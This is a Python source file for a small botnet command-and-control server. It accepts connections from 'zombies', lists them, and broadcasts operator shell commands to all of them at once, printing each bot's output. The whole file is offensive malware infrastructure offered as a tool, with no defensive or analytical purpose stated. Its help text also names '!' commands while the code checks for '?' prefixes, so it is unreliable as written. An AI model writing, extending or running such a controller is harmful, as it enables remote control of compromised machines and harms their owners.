import socket, threading, json
from pystyle import Colorate, Colors


class Color:
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    PURPLE = "\033[1;35m"
    CYAN = "\033[1;36m"
    WHITE = "\033[1;37m"



class Server:
    def __init__(self) -> None:
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.zombies = []

    # Handle connections and sending messages.

    def Handle_Zombie(self, zombie, command, type):
        zombie[0].send(json.dumps((command, type)).encode())

        message = zombie[0].recv(1024).decode()
        if message:
            print(f"""
{Color.RED}{zombie[1]}{Color.WHITE}
+-------------------------+
{message}
+-------------------------+
""")
        return

    def Handle_Zombies(self, command, type=None):
        if not command:
            print("Please supply a command")
            return
        for zombie in self.zombies:
            threading.Thread(target=self.Handle_Zombie, args=[zombie, command, type]).start()

    def Handle_Connections(self):
        while True:
            sock, addr = self.s.accept()
            name = sock.recv(1024).decode()
            if not name:
                name = "No name"
            sock.send(b"Acknowledge")
            self.zombies.append((sock, name))

    # Handling main ui as well as starting server


    def Menu(self):
        print(Colorate.Vertical(Colors.red_to_blue, """

 __           __        ___     __        __ 
/__` |  |\/| |__) |    |__     /  ` |\ | /  `
.__/ |  |  | |    |___ |___    \__, | \| \__,


                                
"""))

    def Main(self):
        self.Menu()
        threading.Thread(target=self.Start).start()
        threading.Thread(target=self.Handle_Connections).start()
        while True:
            command = input("> ")
            if "?help" in command:
                self.Command_Help()
            elif "?command" in command:
                try:
                    command = command.split(" ")
                    self.Command_Command(" ".join(command[1:]))
                except Exception as e:
                    print(e)
            elif "?zombies" in command:
                self.Command_List_Zombies()
            

    def Start(self):
        self.s.bind(('127.0.0.1', 5050))
        self.s.listen(5)
        print("Listenting on 127.0.0.1:5050")



    # Handlig commands and things

    def Command_List_Zombies(self):
        print()
        for zombie in self.zombies:
            print(zombie[1])
        print("\n{} Total bots currently loaded".format(len(self.zombies)))

    def Command_Command(self, cmd):
        self.Handle_Zombies(cmd, "command")

    def Command_Help(self):
        print("""
!command [CMD] -> Run a command on all bots
!zombies       -> List all connected zombies
""")


    

if __name__ == "__main__":
    Server().Main()